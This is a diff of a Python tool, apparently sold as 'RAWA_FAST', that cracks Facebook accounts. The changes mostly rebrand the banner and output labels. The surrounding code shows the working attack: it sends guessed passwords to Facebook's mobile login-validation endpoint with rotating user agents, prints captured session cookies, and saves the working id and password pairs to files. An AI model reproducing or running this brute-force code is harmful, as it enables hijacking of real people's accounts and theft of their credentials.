@@ -266,8 +266,10 @@ def animation(u):
 #------------------[ LOGO-HAMA ]-----------------#
 logo =""" 
 NEW TOOL BY RAWA💀
-TYPE 10$ MONH
-.0
+TYPE 10$ MONH⛄
+UPDATE(1)😃
+VERSION 1.5✍️
+NAME TOOL RAWA_FAST
 ------------------------------------------------------------                              I'm PRO For Cracking 🙂                                                              ------------------------------------------------------------"""
 os.system('clear')
 print(logo)
@@ -457,7 +459,7 @@ def passwrd():
 def crack(idf,pwv):
     global loop,ok,cp
     bo = random.choice([m,k,h,b,u,x])
-    sys.stdout.write(f"\r \r[ PRO ] {P}{k}\033[1;37m{loop}\033[1;31m{P}  {P}{H}[ok] - {ok}{P}  {P}\033[1;31m{x}  {bo}{'{}'.format(loop/float(len(id)))}{P} "),
+    sys.stdout.write(f"\r \r[ RAWA💀 ] {P}{k}\033[1;37m{loop}\033[1;31m{P}  {P}{H}[OPEN] - {ok}{P}  {P}\033[1;31m{x}  {bo}{'{}'.format(loop/float(len(id)))}{P} "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -496,7 +498,7 @@ def crack(idf,pwv):
 }
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\033[1;31mPRO-CP   \033[1;31m{idf} |  \033[1;31m{pw}  ')
+                print(f'\033[1;31mRAWA💀-CP   \033[1;31m{idf} |  \033[1;31m{pw}  ')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
@@ -505,7 +507,7 @@ def crack(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\x1b[32[PRO-OK]\033[1;32m   {idf} | \033[1;32m{pw} | \033[1;32m{kuki}')
+                print(f'\r\x1b[32[RAWA😾-OK]\033[1;32m   {idf} | \033[1;32m{pw} | \033[1;32m{kuki}')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 
                 break
